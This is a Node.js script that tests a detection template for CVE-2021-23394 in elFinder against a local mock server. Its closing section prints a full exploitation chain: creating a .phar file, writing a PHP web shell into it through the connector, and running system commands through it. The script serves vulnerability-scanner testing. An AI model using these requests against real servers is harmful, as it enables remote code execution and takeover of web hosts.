const http = require('http');

console.log('='.repeat(70));
console.log('CVE-2021-23394 TEMPLATE VALIDATION TEST');
console.log('elFinder < 2.1.58 - Remote Code Execution via .phar Upload');
console.log('='.repeat(70));
console.log('');

const MOCK_PORT = 9999;

const mockServer = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${MOCK_PORT}`);
  const cmd = url.searchParams.get('cmd');
  const name = url.searchParams.get('name');
  
  if (url.pathname.includes('connector') && cmd === 'mkfile' && name && name.endsWith('.phar')) {
    const fileHash = 'l1_' + Buffer.from(name).toString('base64').replace(/[^A-Za-z0-9]/g, '').substring(0, 12);
    
    const response = {
      added: [{
        hash: fileHash,
        phash: 'l1_Lw',
        name: name,
        mime: 'application/octet-stream',
        ts: Math.floor(Date.now() / 1000),
        size: 0,
        read: 1,
        write: 1,
        locked: 0
      }]
    };
    
    res.writeHead(200, {
      'Content-Type': 'application/json',
      'X-elFinder-Version': '2.1.57'
    });
    res.end(JSON.stringify(response));
    return;
  }
  
  res.writeHead(404);
  res.end('Not Found');
});

mockServer.listen(MOCK_PORT, () => {
  console.log(`[+] Mock Vulnerable elFinder v2.1.57 started on port ${MOCK_PORT}`);
  console.log('');
  runTests();
});

async function runTests() {
  const endpoints = [
    '/elFinder/php/connector.minimal.php',
    '/elfinder/php/connector.minimal.php', 
    '/php/connector.minimal.php'
  ];
  
  const randomName = 'exploit_' + Math.random().toString(36).substring(7) + '.phar';
  
  console.log('-'.repeat(70));
  console.log('TEMPLATE TESTS');
  console.log('-'.repeat(70));
  console.log('');
  console.log('Template file: http/cves/2021/CVE-2021-23394.yaml');
  console.log('Test payload: cmd=mkfile&target=l1_Lw&name=' + randomName);
  console.log('');
  
  let testNum = 1;
  let passed = 0;
  
  for (const endpoint of endpoints) {
    console.log(`TEST ${testNum}: ${endpoint}`);
    console.log('-'.repeat(50));
    
    const testUrl = `http://localhost:${MOCK_PORT}${endpoint}?cmd=mkfile&target=l1_Lw&name=${randomName}`;
    
    try {
      const result = await makeRequest(testUrl);
      
      console.log('REQUEST:');
      console.log(`  GET ${endpoint}?cmd=mkfile&target=l1_Lw&name=${randomName}`);
      console.log('');
      console.log('RESPONSE STATUS:', result.status);
      console.log('RESPONSE HEADERS:');
      console.log('  Content-Type:', result.headers['content-type']);
      console.log('');
      console.log('RESPONSE BODY:');
      console.log('  ' + result.body);
      console.log('');
      
      const body = JSON.parse(result.body);
      const checks = {
        'Status 200': result.status === 200,
        '"added" in response': result.body.includes('"added"'),
        '"hash" in response': result.body.includes('"hash"'),
        '.phar in response': result.body.includes('.phar'),
        'l1_ hash prefix': result.body.includes('l1_'),
        'Content-Type: application/json': result.headers['content-type'].includes('application/json')
      };
      
      console.log('MATCHER RESULTS:');
      let allPassed = true;
      for (const [check, passed] of Object.entries(checks)) {
        const status = passed ? '[PASS]' : '[FAIL]';
        console.log(`  ${status} ${check}`);
        if (!passed) allPassed = false;
      }
      
      if (allPassed) {
        console.log('');
        console.log('EXTRACTED DATA:');
        if (body.added && body.added[0]) {
          console.log('  file_hash:', body.added[0].hash);
          console.log('  created_file:', body.added[0].name);
        }
        console.log('');
        console.log('>>> VULNERABILITY DETECTED! Template matched successfully.');
        passed++;
      }
    } catch (err) {
      console.log('ERROR:', err.message);
    }
    
    console.log('');
    testNum++;
  }
  
  console.log('='.repeat(70));
  console.log('SUMMARY');
  console.log('='.repeat(70));
  console.log(`Tests passed: ${passed}/${endpoints.length}`);
  console.log(`Template Status: ${passed > 0 ? 'WORKING' : 'NOT WORKING'}`);
  console.log('');
  
  if (passed > 0) {
    console.log('EXPLOITATION CHAIN (if this were a real vulnerable server):');
    console.log('');
    console.log('Step 1: Create .phar file (this template tests this step)');
    console.log('  GET /elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=shell.phar');
    console.log('  -> Response contains hash: l1_XXXXXXXXXXXX');
    console.log('');
    console.log('Step 2: Inject PHP code into .phar file');
    console.log('  GET /elFinder/php/connector.minimal.php?cmd=put&target=l1_XXXX&content=<?=system($_GET[0]);?>');
    console.log('');
    console.log('Step 3: Execute arbitrary commands');
    console.log('  GET /elFinder/files/shell.phar?0=id');
    console.log('  -> uid=33(www-data) gid=33(www-data) groups=33(www-data)');
  }
  
  console.log('');
  console.log('='.repeat(70));
  
  mockServer.close();
  process.exit(0);
}

function makeRequest(url) {
  return new Promise((resolve, reject) => {
    http.get(url, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body: body
        });
      });
    }).on('error', reject);
  });
}
